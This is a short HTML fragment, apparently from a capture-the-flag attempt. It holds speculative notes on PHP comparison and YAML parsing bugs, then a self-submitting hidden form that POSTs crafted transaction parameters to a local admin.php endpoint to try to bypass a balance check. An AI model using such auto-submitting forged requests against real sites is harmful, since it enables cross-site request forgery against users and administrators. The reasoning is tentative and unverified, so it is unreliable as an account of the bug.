THE ACTUAL EXPLOIT:

After analyzing the PHP comparison vulnerabilities from CTFs, I think the 
real issue might be in how PHP handles the arithmetic or comparisons.

But let me try the simplest approach first - what if the vulnerability
is that we can somehow bypass the balance check through a different path?

Looking at the YAML parsing and the transaction processing, maybe there's
a way to manipulate the YAML structure itself.

Let me try the original approach but with URL-encoded parameters:
-->

<form id="f" action="http://localhost:5000/admin.php" method="POST">
    <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions%5B0%5D%5Bamount%5D=1&transactions%5B0%5D%5Bcountry%5D=FLAG">
</form>

<script>
document.getElementById('f').submit();
</script>

</body>
</html>
